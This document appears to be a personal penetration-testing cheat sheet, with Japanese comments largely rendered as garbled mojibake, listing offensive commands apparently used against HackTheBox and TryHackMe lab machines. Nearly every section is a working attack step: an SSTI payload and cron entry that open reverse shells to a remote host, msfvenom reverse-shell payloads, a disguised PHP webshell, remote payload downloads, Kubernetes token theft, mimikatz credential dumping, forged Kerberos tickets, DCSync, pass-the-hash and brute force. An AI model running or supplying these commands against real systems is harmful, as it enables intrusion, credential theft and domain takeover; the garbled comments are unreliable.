<!-- MarkdownTOC -->

- add path
- ファイルの盾��
- curl
- DNS
- ssh
- SSTI \(Server-Side Template Injection\)
- port scan
- kubeletctl
- file upload bypass tech
- ffuf
- sqlmap
- Powershell
- powershell_download_file
- enum4linux
- bloodhound
- rpcclient
- ldapsearch
- wpscan
- nikto
- hydra
- icacls
- vaultcmd
- cmdkey
- RunAs
- smbclient
- msfvenom
- impacket
  - impacket-GetNPUsers
  - impacket-GetUserSPNs
  - impacket-secretsdump
  - impakcet-psexec
- kekeo
- Invoke-Mimikatz
- mimikatz
- ForgeCert
- Rubeus
- NTDS Util
- evil-winrm
- DCSync
- xfreerdp
- hashcat
- python
- bash
- Auto Setup Credentials
- windows history
- IIS connectstring
- schtask
- RoguePotato
- meterpreter

<!-- /MarkdownTOC -->

# add path
```shell
export PATH=$PATH:弖紗したいコマンド�碧�パス
```
# ファイルの盾��
```shell
# �R�s
tar -zcvf xxxx.tar.gz directory
tar -jcvf xxxx.tar.bz2 directory
tar -Jcvf xxxx.tar.xz directory
tar -cvf xxxx.tar directory
zip -r xxxx.zip directory
gzip *ファイル兆*

# 盾��
tar -zxvf xxxx.tar.gz
tar -jxvf xxxx.tar.bz2
tar -Jxvf xxxx.tar.xz
tar -xvf xxxx.tar
unzip xxxx.zip
gzip -d *ファイル兆*.gz

echo "content" | base64 -d > out
file out
# out: Zip archive data, at least v2.0 to extract, compression method=deflate
unzip out
fcrackzip -D -p rockyou.txt -u out
```


# curl
```shell
curl http://10.10.16.17/LinEnum.sh | bash
```
# DNS
```shell
nslookup 10.10.10.13 10.10.10.13(DNS Server addr)
# 13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.

dig any victim.com @<DNS_IP>

dig axfr @10.10.10.13 cronos.htb
# ; <<>> DiG 9.19.21-1-Debian <<>> axfr @10.10.10.13 cronos.htb
# ; (1 server found)
# ;; global options: +cmd
# cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
# cronos.htb.		604800	IN	NS	ns1.cronos.htb.
# cronos.htb.		604800	IN	A	10.10.10.13
# admin.cronos.htb.	604800	IN	A	10.10.10.13
# ns1.cronos.htb.		604800	IN	A	10.10.10.13
# www.cronos.htb.		604800	IN	A	10.10.10.13
# cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
# ;; Query time: 776 msec
# ;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
# ;; WHEN: Sat Jun 01 18:56:18 JST 2024
# ;; XFR size: 7 records (messages 1, bytes 203)

# brute force
dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN>

# list.txtを喘吭
for ip in $(cat list.txt); do host $ip.megacorpone.com; done | grep -v "not found"
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

# ssh
```shell
ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
```

# SSTI (Server-Side Template Injection)
```shell
{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "bash -i >& /dev/tcp/attacker.com/8080 0>&1"').read()}}
```

# port scan
```shell
# nmap
ports=$(sudo nmap -sS -Pn -p- --min-rate=1000 -T4 10.10.11.130 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sS -Pn -T4 -p$ports -sV -sC 10.10.11.130

# bash
for PORT in {0..65536}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

# kubeletctl
```shell
 
# Podの双��
kubeletctl --server 10.10.11.133 pods

# RCE辛嬬なPodのスキャン
kubeletctl --server 10.10.11.133 scan rce
�逢ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ�
��                                   Node with pods vulnerable to RCE                                  ��
�制ぉぉぉ乂ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ乂ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ乂ぉぉぉぉぉぉぉぉぉぉぉぉぉ乂ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ乂ぉぉぉぉぉ�
��   �� NODE IP      �� PODS                               �� NAMESPACE   �� CONTAINERS              �� RCE ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
��   ��              ��                                    ��             ��                         �� RUN ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 1 �� 10.10.11.133 �� kube-scheduler-steamcloud          �� kube-system �� kube-scheduler          �� -   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 2 ��              �� etcd-steamcloud                    �� kube-system �� etcd                    �� -   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 3 ��              �� kube-apiserver-steamcloud          �� kube-system �� kube-apiserver          �� -   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 4 ��              �� storage-provisioner                �� kube-system �� storage-provisioner     �� -   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 5 ��              �� kube-proxy-6s86w                   �� kube-system �� kube-proxy              �� +   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 6 ��              �� coredns-78fcd69978-7tc4p           �� kube-system �� coredns                 �� -   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 7 ��              �� nginx                              �� default     �� nginx                   �� +   ��
�制ぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ爰ぉぉぉぉぉ�
�� 8 ��              �� kube-controller-manager-steamcloud �� kube-system �� kube-controller-manager �� -   ��
�県ぉぉぉ悸ぉぉぉぉぉぉぉぉぉぉぉぉぉぉ悸ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ悸ぉぉぉぉぉぉぉぉぉぉぉぉぉ悸ぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉぉ悸ぉぉぉぉぉ�


# RCE -p: Pod name -c: Container name
kubeletctl --server 10.10.11.133 exec "id" -p nginx -c nginx

# ト�`クンと�^苧��の函誼
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx

# ��撹ファイルを恬撹
cat f.yaml

apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

# ト�`クンと�^苧��を聞ってpodを函誼
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods

# �慙泙隆_�J
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 auth can-i --list

# ��吭のあるpodを恬撹
kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 apply -f f.yaml

# 恬撹できたか�_�J
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods
```

# file upload bypass tech
```shell
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```

# ffuf
```shell
# サブドメインの双��
ffuf -t 200 -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H 'Host: FUZZ.devvortex.htb' -fw 4
ffuf -u http://corporate.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.corporate.htb" -t 200 -fw 5

# ブル�`トフォ�`ス
ffuf -request r.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSFUZZ -mc 200 -t 200

# burp intruderの旗喘
ffuf -u http://10.10.10.93/transfer.aspx -w extensions.txt -request request.txt -fw 94


```

# sqlmap
```shell
sqlmap -r req.txt --current-user --batch
sqlmap -r login.req --level=5 --risk=3 --string="Wrong identification" --technique=B -T users -D falafel --dump
```

# Powershell
```shell
# ユ�`ザの弖紗
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"

# ユ�`ザの�碧�
Get-ADGroupMember -Identity "IT Support"

# ユ�`ザの侭奉するグル�`プ
Get-ADPrincipalGroupMembership -Identity fsmith | Select-Object Name
```

# powershell_download_file
```shell
certutil -urlcache -split -f http://10.10.14.2/payload2.exe payload2.exe
bitsadmin /transfer transfName /priority high http://10.10.14.26/exploit.exe exploit.exe
powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe')"
(New-Object Net.WebClient).DownloadFile("http://10.10.14.26/exploit.exe","exploit.exe")
wget "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
Invoke-WebRequest "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
```

# enum4linux
```shell
enum4linux IP

# より����に双��
enum4linux -a IP
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
```
# bloodhound
```shell
# Remote
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller Ip> -d <Domain> -c All --zip

# On site

.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>

```

# rpcclient
```shell
rpcclient -U "" -N 10.200.16.100
```

# ldapsearch
```shell
ldapserach -x -H ldap://dc-ip-here -s base namingcontexts
ldapsearch -LLL -x -H ldap://10.200.16.100 -b '' -s base '(objectclass=*)'
```

# wpscan
```shell
wpscan --url IP

# ユ�`ザ双��
wpscan --url IP --enumerate u

# 畠双��
wpscan --url URL -e

wpscan --url URL -U admin -P /usr/share/wordlists/rockyou.txt
```

# nikto
```shell
nikto --url IP_ADDRESS | tee nikto-results
```

# hydra
```shell
hydra -l USERNAME -p PASSWORD IPADDRESS ftp
hydra -L USERLIST -P PASSLIST ssh://IPADDRESS
hydra -l USERNAME -P PASSLIST http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:wrongPASS' -f -V
hydra -L USERLIST -p password IPADDRESS http-get '/:A=NTLM:F=401'
```

# icacls
```bat
icacls
```
# vaultcmd
```bat
rem　隠贋されている�Y鯉秤�鵑料��� 
vaultcmd /list

rem Web Credentials Vaultに隠贋されている�Y鯉秤�鵑�あるか�_�J
vaultcmd /listproperties:"Web Credentials"

rem 隠贋されている�Y鯉秤�鵑淋���を�_�J
vaultcmd /listcreds:"Web Credentials"
```

# cmdkey
```bat
cmdkey /list
runas /savecred /user:admin cmd.exe
```

# RunAs
```bat
runas /savecred /user:THM.red\thm-local cmd.exe
```

# smbclient
```shell
# 俊�A
smbclient //10.10.10.10/sharename -U username -p port
smbclient -U "username" \\\\domain.local\\sharename

# 双��
smbclient -L 10.10.215.171
smbclient -U "svc-admin" -L domain.local

# ダウンロ�`ドできるものを畠てダウンロ�`ド
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

# msfvenom
```shell
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.8.109.203 lport=1234 -f elf -o exploit.elf
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.109.203 lport=1234 -f sh -o exploit.sh
msfvenom -x <existing-elf-file> -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf -o injected.elf

```

# impacket
## impacket-GetNPUsers
```shell
# Kerberos並念�J�^を駅勣としない�O協になっているADユ�`ザのパスワ�`ドハッシュ函誼
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.10.10 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
impacket-GetNPUsers spookysec.local/backup -no-pass -dc-ip 10.10.10.10
```

## impacket-GetUserSPNs
```shell
impacket-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!"
impakcet-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!" -request-user svc-user
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
```

## impacket-secretsdump
```shell
impacket-secretsdump -security path/to/security -system path/to/system -ntds path/to/ntds.dit
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impakcet-secretsdump spookysec.local/backup:password123@spookysec.local
```

## impakcet-psexec
```shell
impacket-psexec Administrator:@spookysec.local -hashes 0e363213e37b94221497260b0bcb4fc
```

# kekeo
```bat
rem サ�`ビスのチケット伏撹
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password
```

# Invoke-Mimikatz
```shell
import-module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```

# mimikatz
```bat
rem one liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"

rem lsa隠�oを�o�燭砲垢襯疋薀ぅ个鬟ぅ鵐櫞`トして�o�浸�
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove

rem SeDebugPrivilege�慙泙鰉��燭砲靴討澆頭F壓の�慙泙魎_�J
mimikatz # privilege::debug

rem 渇竃
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman

rem SYSTEMユ�`ザへのなりすまし
mimikatz # token::elevate

rem レジストリハイブから�Y鯉秤�鵑瞭塾弔鯣ゝ�
mimikatz # lsadump::secrets

rem �g佩ログの函誼枠�O協
mimikatz # log dcdump.txt

rem DC揖豚を旋喘してハッシュを竃薦
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

rem ゴ�`ルデンチケット�淋�
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

rem シルバ�`チケット�淋�
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:16f9af38fca3ada405386b3b57366082 /service:cifs /ptt

rem DCに隠贋されている�^苧��のチェック
mimikatz # crypto::certificates /systemstore:local_machine 
rem Exportable key: NOに�O協されてた��栽に�iみ�zむパッチ
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
rem �^苧��キ�`のエクスポ�`ト
mimikatz # crypto::certificates /systemstore:local_machine /export


```

# ForgeCert
```bat
rem エクスポ�`トした�^苧��を聞って�eの�^苧��伏撹
ForgeCert.exe --CaCertPath local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

# Rubeus
```bat
rem 恬った�^苧��を聞ってTGTリクエスト僕佚
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fulladmin.pfx /password:Password123 /outfile:fulladmin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

# NTDS Util
```bat
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

# evil-winrm
```shell
# login
evil-winrm -u user -p password -i 10.10.10.10

# PtH
evil-winrm -u user -H 0e363213e37b94221497260b0bcb4fc -i 10.10.10.10

menu
Bypass-4MSI
```

# DCSync
```shell
$pass = convertto-securestring 'password' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\user', $pass)
add-objectACL -principalidentity user -credential $cred -rights DCSync
```

# xfreerdp
```shell
# login
xfreerdp /u:user /p:password /v:10.10.10.10 +clipboard /size:1920x1080

# PtH
xfreerdp /u:user /H:0e363213e37b94221497260b0bcb4fc /v:10.10.10.10 +clipboard /size:1920x1080

# connect to windows 7
xfreerdp /u:admin /p:password /v:10.10.174.238 /dynamic-resolution /cert:ignore /workarea /tls-seclevel:0
```

# hashcat
[hash example](https://hashcat.net/wiki/doku.php?id=example_hashes)
```shell
# 看��好��
hashcat -m 1400 -a 0 hash.txt password.lst

# ブル�`トフォ�`ス
hashcat -m 1400 -a 3 hash.txt
```

# python
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

shell = '''
 *  *  *  *  * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 1235 >/tmp/f
'''
f=open('file_to_path', 'a')
f.write(shell)
f.close()

```

# bash
```shell
# シェルの芦協晒
/bin/bash -i
```

# Auto Setup Credentials
```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

rem <Credentials>
rem     <Username>Administrator</Username>
rem     <Domain>thm.local</Domain>
rem     <Password>MyPassword123</Password>
rem </Credentials>
```

# windows history
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

# IIS connectstring
```bat
type C:\inetpub\wwwroot\web.config | findstr connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

# schtask
```bat
schtasks /query /tn vulntask /fo list /v
```

# RoguePotato
```cmd
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```

# meterpreter
```shell
run post/multi/recon/local_exploit_suggester
```